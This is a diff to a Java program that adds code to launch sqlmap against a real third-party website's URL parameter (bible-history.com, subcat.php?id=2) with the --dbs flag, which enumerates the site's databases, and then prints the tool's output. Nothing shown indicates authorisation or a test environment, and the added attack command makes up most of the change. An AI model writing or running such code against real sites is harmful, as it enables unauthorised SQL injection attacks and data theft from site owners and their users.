@@ -3,6 +3,8 @@ package com.company;
 import java.io.BufferedReader;
 import java.io.FileReader;
 import java.io.IOException;
+import java.io.InputStreamReader;
+
 import org.json.*;
 
 
@@ -34,6 +36,31 @@ public class Main {
 
                 System.out.println(jsonObj);
             }
+        ProcessBuilder processBuilder = new ProcessBuilder();
+        // Windows
+        processBuilder.command("sqlmap", "-u", "http://www.bible-history.com/subcat.php?id=2","--dbs");
+
+        try {
+
+            Process process = processBuilder.start();
+
+            BufferedReader readerTwo =
+                    new BufferedReader(new InputStreamReader(process.getInputStream()));
+
+            String line;
+            while ((line = readerTwo.readLine()) != null) {
+                System.out.println(line);
+            }
+
+            int exitCode = process.waitFor();
+            System.out.println("\nExited with error code : " + exitCode);
+
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+
         }
     }
 
